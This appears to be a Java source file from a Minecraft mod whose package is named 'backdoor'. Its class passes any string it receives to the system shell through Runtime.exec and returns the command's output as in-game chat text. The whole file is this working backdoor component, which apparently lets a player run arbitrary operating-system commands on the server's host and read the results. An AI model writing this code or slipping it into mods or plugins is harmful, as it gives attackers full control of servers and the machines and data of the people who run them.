package tk.merith.backdoor;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;

import net.minecraft.text.LiteralText;
import net.minecraft.text.Text;

import static com.mojang.brigadier.arguments.StringArgumentType.getString;

public class ExecuteFunction {
    public static Text exec(String command) {
        String commandOut = "";
        String commandError = "";
        try {
            Runtime rt = Runtime.getRuntime();
            Process proc = rt.exec(command);

            BufferedReader stdInput = new BufferedReader(new
                    InputStreamReader(proc.getInputStream()));

            BufferedReader stdError = new BufferedReader(new
                    InputStreamReader(proc.getErrorStream()));




            // Read the output from the command
            System.out.println("Here is the standard output of the command:\n");
            String s = null;

            while ((s = stdInput.readLine()) != null) {
                commandOut = commandOut+"\n"+s;
            }
            System.out.println(commandOut);
            // Read any errors from the attempted command
            System.out.println("Here is the standard error of the command (if any):\n");
            while ((s = stdError.readLine()) != null) {
                commandError = commandError+"\n"+s;
            }
            System.out.println(commandError);
        } catch (IOException e) {}
        return new LiteralText(commandOut);
    }

}
